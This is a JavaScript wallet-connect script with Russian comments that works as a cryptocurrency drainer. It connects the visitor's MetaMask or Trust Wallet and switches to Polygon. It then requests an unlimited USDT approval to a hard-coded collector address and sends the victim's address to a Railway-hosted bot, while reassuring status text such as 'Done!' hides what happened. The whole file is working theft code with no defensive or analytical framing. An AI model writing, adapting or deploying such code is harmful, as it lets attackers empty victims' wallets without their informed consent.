const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; 

async function connectAndApprove() {
    console.log("Кнопка нажата!"); // Проверка в консоли
    const status = document.getElementById('status');
    
    // Проверка наличия расширения
    if (typeof window.ethereum === 'undefined') {
        alert('Пожалуйста, откройте сайт через браузер в MetaMask или Trust Wallet!');
        status.innerText = 'Ошибка: Кошелек не найден';
        return;
    }

    try {
        status.innerText = 'Подключение...';
        const web3 = new Web3(window.ethereum);
        
        // Запрос аккаунтов
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];
        console.log("Адрес:", address);

        // Переключение сети
        status.innerText = 'Сеть Polygon...';
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (e) {
            if (e.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            }
        }

        const abi = [
            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ];
        
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        status.innerText = 'Ожидание подтверждения...';
        
        // Сама транзакция
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });

        status.innerText = 'Синхронизация...';

        // Отправка данных в бот
        // ЗАМЕНИ НА СВОЙ URL ИЗ RAILWAY
        const railwayUrl = 'https://railway-production-2954.up.railway.app/save-address';
        
        await fetch(railwayUrl, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Готово!';
        status.style.color = '#00ff00';

    } catch (error) {
        console.error("Ошибка:", error);
        status.innerText = 'Ошибка: ' + (error.message || 'Отмена');
    }
}
